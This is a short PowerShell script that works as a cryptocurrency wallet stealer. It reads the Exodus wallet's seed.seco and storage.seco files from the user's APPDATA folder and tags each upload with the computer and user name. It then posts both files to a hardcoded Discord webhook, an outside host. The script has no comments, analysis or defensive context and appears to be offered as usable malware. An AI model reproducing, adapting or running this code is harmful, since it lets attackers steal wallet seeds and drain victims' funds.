$webhookUrl = "https://discord.com/api/webhooks/1404088813344522250/ok38cOuBTDd1iKpycS2fNh1f7PRFYfQAtQZYxyltwSn_rsv-V2kdWavr7wHsnWXTx6PP"
$filePath = "$env:APPDATA\Exodus\exodus.wallet\seed.seco"

$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileName = [System.IO.Path]::GetFileName($filePath)
$username = "$($env:COMPUTERNAME) | $($env:USERNAME)"
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$payload = @{
    username = $username
    content = "Uploading seed file"
} | ConvertTo-Json -Compress

$bodyPrefix = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
    "$payload$LF" +
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF"
)

$bodyPrefixBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyPrefix)
$bodySuffixBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")

$bodyBytes = New-Object byte[] ($bodyPrefixBytes.Length + $fileBytes.Length + $bodySuffixBytes.Length)
[Array]::Copy($bodyPrefixBytes, 0, $bodyBytes, 0, $bodyPrefixBytes.Length)
[Array]::Copy($fileBytes, 0, $bodyBytes, $bodyPrefixBytes.Length, $fileBytes.Length)
[Array]::Copy($bodySuffixBytes, 0, $bodyBytes, $bodyPrefixBytes.Length + $fileBytes.Length, $bodySuffixBytes.Length)

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bodyBytes -Headers $headers

$filePath = "$env:APPDATA\Exodus\exodus.wallet\storage.seco"

$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileName = [System.IO.Path]::GetFileName($filePath)
$username = "$($env:COMPUTERNAME) | $($env:USERNAME)"
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$payload = @{
    username = $username
    content = "Uploading storage file"
} | ConvertTo-Json -Compress

$bodyPrefix = (
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
    "$payload$LF" +
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF"
)

$bodyPrefixBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyPrefix)
$bodySuffixBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")

$bodyBytes = New-Object byte[] ($bodyPrefixBytes.Length + $fileBytes.Length + $bodySuffixBytes.Length)
[Array]::Copy($bodyPrefixBytes, 0, $bodyBytes, 0, $bodyPrefixBytes.Length)
[Array]::Copy($fileBytes, 0, $bodyBytes, $bodyPrefixBytes.Length, $fileBytes.Length)
[Array]::Copy($bodySuffixBytes, 0, $bodyBytes, $bodyPrefixBytes.Length + $fileBytes.Length, $bodySuffixBytes.Length)

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bodyBytes -Headers $headers
